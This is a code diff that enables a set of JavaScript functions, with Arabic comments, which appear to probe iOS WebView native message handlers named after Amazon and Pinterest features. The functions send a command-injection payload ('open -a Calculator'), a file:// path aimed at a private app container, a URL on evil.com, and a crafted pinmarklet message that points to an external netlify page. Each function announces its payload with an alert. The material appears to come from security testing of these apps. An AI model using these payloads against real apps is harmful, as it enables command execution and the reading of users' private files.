@@ -51,42 +51,51 @@
       }
     }
 
-    // function sendAmazonShop() {
-    //   try {
-    //     // محاولة حقن أمر (لو handler يسمح بتنفيذ أوامر)
-    //     window.webkit.messageHandlers.AmazonShopExternalInterfaceHandler.postMessage({
-    //       action: "execute",
-    //       command: "open -a Calculator"  // أو أي أمر ممكن ينفذه النيتف
-    //     });
-    //     alert("✅ Sent command injection payload to AmazonShopExternalInterfaceHandler");
-    //   } catch (e) {
-    //     alert("❌ Error: " + e.message);
-    //   }
-    // }
+    function sendAmazonShop() {
+      try {
+        // محاولة حقن أمر (لو handler يسمح بتنفيذ أوامر)
+        window.webkit.messageHandlers.AmazonShopExternalInterfaceHandler.postMessage({
+          action: "execute",
+          command: "open -a Calculator"  // أو أي أمر ممكن ينفذه النيتف
+        });
+        alert("✅ Sent command injection payload to AmazonShopExternalInterfaceHandler");
+      } catch (e) {
+        alert("❌ Error: " + e.message);
+      }
+    }
 
-    // function sendPinImageOffScreen() {
-    //   try {
-    //     // محاولة path traversal لقراءة ملفات حساسة
-    //     window.webkit.messageHandlers.PinImageOffScreenDetectionHandler.postMessage({
-    //       url: "file:///private/var/mobile/Containers/Data/Application/403983B1-9B7C-4405-BA97-B9581EBD7799/C"
-    //     });
-    //     alert("✅ Sent path traversal payload to PinImageOffScreenDetectionHandler");
-    //   } catch (e) {
-    //     alert("❌ Error: " + e.message);
-    //   }
-    // }
+    function sendPinImageOffScreen() {
+      try {
+        // محاولة path traversal لقراءة ملفات حساسة
+        window.webkit.messageHandlers.PinImageOffScreenDetectionHandler.postMessage({
+          url: "file:///private/var/mobile/Containers/Data/Application/403983B1-9B7C-4405-BA97-B9581EBD7799/C"
+        });
+        alert("✅ Sent path traversal payload to PinImageOffScreenDetectionHandler");
+      } catch (e) {
+        alert("❌ Error: " + e.message);
+      }
+    }
 
-    // function sendPinmarkletCompletion() {
-    //   try {
-    //     // محاولة تمرير رابط خبيث (ممكن يستغل تحميل صور ضارة مثلا)
-    //     window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage({
-    //       imageUrl: "https://evil.com/malicious.jpg"
-    //     });
-    //     alert("✅ Sent malicious URL payload to pinmarkletCompletionHandler");
-    //   } catch (e) {
-    //     alert("❌ Error: " + e.message);
-    //   }
-    // }
+    function sendPinmarkletCompletion() {
+      try {
+        // محاولة تمرير رابط خبيث (ممكن يستغل تحميل صور ضارة مثلا)
+     
+        const data = {
+        type: "pinmarklet",
+        v: "v6.1.0",
+        pmReason: "scan_complete",
+        pmCount: 1,
+        pmTime: 143,
+        pmClient: "ios",
+        pmUrl: "https://astonishing-ganache-ed3660.netlify.app/arc.html"
+};
+
+window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage(data);
+
+      } catch (e) {
+        alert("❌ Error: " + e.message);
+      }
+    }
 
     
 
